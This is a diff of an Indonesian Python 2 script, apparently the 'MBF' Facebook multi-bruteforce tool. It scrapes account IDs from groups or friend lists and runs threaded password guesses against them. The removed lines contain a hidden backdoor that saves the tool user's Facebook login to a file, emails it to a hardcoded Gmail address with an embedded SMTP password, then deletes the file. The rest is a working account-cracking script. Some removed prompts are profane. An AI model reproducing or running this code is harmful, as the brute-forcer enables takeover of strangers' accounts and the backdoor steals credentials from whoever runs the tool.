@@ -1,10 +1,5 @@
 from __future__ import print_function
-import platform, os, smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-
+import platform,os
 def tampil(x):
 	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
 	for i in w:
@@ -13,17 +8,17 @@ def tampil(x):
 	x=x.replace('\r0','\033[0m')
 	print(x)
 if platform.python_version().split('.')[0] != '2':
-	tampil('\rm[!]==// kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
+	tampil('\rm[!] kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
 	os.sys.exit()
 import cookielib,re,urllib2,urllib,threading
 try:
 	import mechanize
 except ImportError:
-	tampil('\rm[!]==// SepertiNya Module \rcmechanize\rm belum di install...')
+	tampil('\rm[!]SepertiNya Module \rcmechanize\rm belum di install...')
 	os.sys.exit()
 def keluar():
 	simpan()
-	tampil('\rm[!]==// Keluar')
+	tampil('\rm[!]Keluar')
 	os.sys.exit()
 log = 0
 id_bteman = []
@@ -51,17 +46,17 @@ def inputD(x,v=0):
 		try:
 			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
 		except:
-			tampil('\n\rm[!]==// Batal')
+			tampil('\n\rm[!]Batal')
 			keluar()
 		if v:
 			if a.upper() in v:
 				break
 			else:
-				tampil('\rm[!]==// Pilih opsinya dong Goblok')
+				tampil('\rm[!]Masukan Opsinya Bro...')
 				continue
 		else:
 			if len(a) == 0:
-				tampil('\rm[!]==// Yang bener dong Ngentod')
+				tampil('\rm[!]Masukan dengan benar')
 				continue
 			else:
 				break
@@ -71,71 +66,36 @@ def inputM(x,d):
 		try:
 			i = int(inputD(x))
 		except:
-			tampil('\rm[!]==// Pilihan tidak ada')
+			tampil('\rm[!]Pilihan tidak ada')
 			continue
 		if i in d:
 			break
 		else:
-			tampil('\rm[!]==// Pilihan tidak ada')
+			tampil('\rm[!]Pilihan tidak ada')
 	return i
-def kirim():
-   email_user = 'asulokentoddd@tutanota.com'
-   email_password = 'Ngentodlonte123'
-   email_send = 'yaelahgii@gmail.com'
-
-   subject = 'STOR FB NIH ANJING'
-
-   msg = MIMEMultipart()
-   msg['From'] = email_user
-   msg['To'] = email_send
-   msg['Subject'] = subject
-
-   body = '[+]==// Akun Orang Goblok //==[+]'
-   msg.attach(MIMEText(body,'plain'))
-
-   filename='log.txt'
-   attachment  =open('log.txt','rb')
-
-   part = MIMEBase('application','octet-stream')
-   part.set_payload((attachment).read())
-   encoders.encode_base64(part)
-   part.add_header('Content-Disposition',"attachment; filename= "+filename)
-
-   msg.attach(part)
-   text = msg.as_string()
-   server = smtplib.SMTP('smtp.gmail.com',587)
-   server.starttls()
-   server.login(email_user,email_password)
-
-
-   server.sendmail(email_user,email_send,text)
-   server.quit()
-
-def hapus():
-	os.remove('log.txt')
 def simpan():
 	if len(id_bgroup) != 0:
-		tampil('\rh[!]==// Saving \rcMBFbgroup.txt...')
+		tampil('\rh[*]Menyimpan hasil dari group')
 		try:
 			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
-			tampil('\rc[*]==// Saved!!')
+			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.txt')
 		except:
-			tampil('\rm[!]==// Failed!!')
+			tampil('\rm[!]Gagal meyimpan')
 	if len(id_bteman) != 0:
-		tampil('\rh[!]==// Saving \rcMBFbgteman.txt')
+		tampil('\rh[*]Menyimpan hasil daftar Teman...')
 		try:
 			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
-			tampil('\rc[*]==// Saved!!')
+			tampil('\rh[!]Berhasil meyimpan \rcMBFbgteman.txt')
 		except:
-			tampil('\rm[!]==// Failed!!')
+			tampil('\rm[!]Gagal meyimpan')
 def buka(d):
-	tampil('\rh[*]==// Accessing \rp'+d+'...')
+	tampil('\rh[*]Membuka \rp'+d)
 	try:
 		x = br.open(d)
 		br._factory.is_html = True
 		x = x.read()
 	except:
-		tampil('\rm[!]==// Accessing \rp'+d+' >> Failed!!')
+		tampil('\rm[!]Gagal membuka \rp'+d)
 		keluar()
 	if '<link rel="redirect" href="' in x:
 		return buka(br.find_link().url)
@@ -143,9 +103,9 @@ def buka(d):
 		return x
 def login():
 	global log
-	us = inputD('[?]==// Login >>')
-	pa = inputD('[?]==// Pass  >>')
-	tampil('\n\rh[*]==// Please Wait....')
+	us = inputD('[?]Email/HP')
+	pa = inputD('[?]Kata Sandi')
+	tampil('\rh[*]Sedang Login....')
 	buka('https://m.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -153,23 +113,14 @@ def login():
 	br.submit()
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
-		tampil('\rh[*]==// Login Successed!!')
+		tampil('\rh[*]Login Berhasil')
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]==// Welcome \rk%s\n'%nama)
+		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
 		log = 1
-		z = open("log.txt","w")
-		z.write("USERNAME : ")
-		z.write(us)
-		z.write("\n")
-		z.write(" PASSWORD : ")
-		z.write(pa)
-		z.close()
-		kirim()
-		hapus()
 	elif 'checkpoint' in url:
-		tampil('\rm[!]==// Akun kena checkpoint\n\rk[!]==// Coba Login dengan opera mini')
+		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
 		keluar()
 	else:
 		tampil('\rm[!]Login Gagal')
@@ -190,21 +141,21 @@ def saring_id_group0():
 	global id_group
 	while 1:
 		id_group = inputD('[?]Id Group')
-		tampil('\rh[*]==// Mengecek Group....')
+		tampil('\rh[*]Mengecek Group....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 			break
 		except:
-			tampil('\rm[!]==// ERROR!!')
+			tampil('\rm[!]Id yang anda masukan salah')
 			continue
-	tampil('\rh[*]==// Mengambil Id dari group \rc%s'%nama)
+	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
 	saring_id_group1(a)
 	return next
 def idgroup():
 	if log != 1:
-		tampil('\rh[*]==// Login Please')
+		tampil('\rh[*]Login dulu bos...')
 		login()
 		if log == 0:
 			keluar()
@@ -214,17 +165,17 @@ def idgroup():
 		try:
 			next = br.find_link(url_regex= '/browse/group/members/').url
 		except:
-			tampil('\rm[!]==// Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
+			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
 			break
 	simpan()
-	i = inputD('[?]==// Continue? (y/t)',['Y','T'])
+	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(id_bgroup)
 	else:
 		return menu()
 def idteman():
 	if log != 1:
-		tampil('\rh[*]==// Login Please')
+		tampil('\rh[*]Login dulu bos...')
 		login()
 		if log == 0:
 			keluar()
@@ -233,19 +184,19 @@ def idteman():
 		next = br.find_link(url_regex= 'friends_center_main').url
 	except:
 		if len(id_teman) != 0:
-			tampil('\rm[!]==// Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
 		else:
-			tampil('\rm[!]==// Batal')
+			tampil('\rm[!]Batal')
 			keluar()
 	while 1:
 		saring_id_teman(buka(next))
 		try:
 			next = br.find_link(url_regex= 'friends_center_main').url
 		except:
-			tampil('\rm[!]==// Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
 			break
 	simpan()
-	i = inputD('[?]==// Continue? (y/t)',['Y','T'])
+	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(id_bteman)
 	else:
@@ -273,31 +224,31 @@ class mt(threading.Thread):
         else:
             self.a = 0
 def crack(d):
-	i = inputD('[?]==// Use Passwordlist/Manual (p/m)',['P','M'])
+	i = inputD('[?]Pake Passwordlist/Manual (p/m)',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]==// Input filename >>')
+			dir = inputD('[?]Masukan alamat file')
 			try:
 				D = open(dir,'r').readlines()
 			except:
-				tampil('\rm[!]==// Failed!! \rk%s'%dir)
+				tampil('\rm[!]Gagal membuka \rk%s'%dir)
 				continue
 			break
-		tampil('\rh[*]==// Cracking with \rk%d password'%len(D))
+		tampil('\rh[*]Memulai crack dengan \rk%d password'%len(D))
 		for i in D:
 			i = i.replace('\n','')
 			if len(i) != 0:
 				crack0(d,i,0)
-		i = inputD('[?]==// Try Again?? (y/t)',['Y','T'])
+		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
 		if i.upper() == 'Y':
 			return crack(d)
 		else:
 			return menu()
 	else:
-		return crack0(d,inputD('[?]==// INput Passwd >>'),1)
+		return crack0(d,inputD('[?]Sandi'),1)
 def crack0(data,sandi,p):
-	tampil('\rh[*]==// Crack \rk%d Acc \rhWith \rm[\rk%s\rmPasswd]'%(len(data),sandi))
-	print('\033[32;1m[*]==// Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
+	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
+	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
 	os.sys.stdout.flush()
 	akun_jml = []
 	akun_sukses = []
@@ -328,7 +279,7 @@ def crack0(data,sandi,p):
 						akun_gagal.append(a[1])
 					elif a[0] == 8:
 						akun_error.append(a[1])
-					print('\r\033[32;1m[*]==// Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
+					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
 					os.sys.stdout.flush()
 					akun_jml.append(a[1])
 		except KeyboardInterrupt:
@@ -337,17 +288,17 @@ def crack0(data,sandi,p):
 			if threading.activeCount() == 1:break
 		except KeyboardInterrupt:
 			keluar()
-	print('\r\033[32;1m[*]==// Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
+	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
 	if len(akun_sukses) != 0:
-		tampil('\rh[*]==// Success!!')
+		tampil('\rh[*]Daftar akun sukses')
 		for i in akun_sukses:
 			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
-	tampil('\rh[*]==// Success >>\rp      %d'%len(akun_sukses))
-	tampil('\rm[*]==// Failed >>\rp         %d'%len(akun_gagal))
-	tampil('\rk[*]==// CheckPoint >>\rp      %d'%len(akun_cekpoint))
-	tampil('\rc[*]==// Error >>\rp         %d'%len(akun_error))
+	tampil('\rh[*]Jumlah akun berhasil\rp      %d'%len(akun_sukses))
+	tampil('\rm[*]Jumlah akun gagal\rp         %d'%len(akun_gagal))
+	tampil('\rk[*]Jumlah akun cekpoint\rp      %d'%len(akun_cekpoint))
+	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
 	if p:
-		i = inputD('[?]==// Try Again? (y/t)',['Y','T'])
+		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
 		if i.upper() == 'Y':
 			return crack(data)
 		else:
@@ -375,34 +326,31 @@ def lanjutG():
 			fid_bgroup = []
 	return 0
 def menu():
-	tampil('''\rc
-             .-.-..
-            /+/++//
-           /+/++//
-    \rk*   *\rc /+/++//
-     \ /  |/\rk__\rc//
-   {\rmX\rc}v{\rmX\rc}\rk|\rhN.H\rk|\rc==========.
-     \rc[']  /\rk'\rc|\rk'\rc\           \\
-         /  \  \           \rm'
-         \_  \_ \_    \rk__\rmMBF \rc3.1\rk__''')
-	tampil('''
-\rk[+]==============================[+]
-\rk[+]==//         \rcMenu         \rk//==[+]
-\rk[+]==============================[+]
-\rk[\rc1\rk]==//     \rhDaftar Teman     \rk//==[\rc1\rk]
-\rk[\rc2\rk]==//     \rhAnggota Grup     \rk//==[\rc2\rk]
-\rk[\rc3\rk]==//        \rmKELUAR        \rk//==[\rc3\rk]
-\rk[+]==============================[+]
-	''')
-	i = inputM('[?]==// Input >>',[1,2,3])
+	tampil('''\rh
+                     .-.-..
+                    /+/++//
+                   /+/++//
+            \rk*   *\rh /+/++//
+             \ /  |/__//
+           {\rmX\rh}v{\rmX\rh}|\rcPRX\rh|==========.
+             [']  /'|'\           \\
+                 /  \  \           '
+                 \_  \_ \_    \rk*\rhDragonFly ZomBie
+\rk###########################################################
+#             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #
+# \rhBY\rp                                             PIRMANSX \rk#
+# \rhGroup FB\rp  https://m.facebook.com/groups/164201767529837 \rk#
+# \rhGitHub\rp                      https://github.com/pirmansx \rk#
+#       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
+###########################################################''')
+	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
+	i = inputM('[?]PILIH',[1,2,3])
 	if i == 1:
-		lanjutT()
-		idteman()
-		
-	elif i == 2:
 		lanjutG()
 		idgroup()
-
+	elif i == 2:
+		lanjutT()
+		idteman()
 	elif i == 3:
 		keluar()
 bacaData()
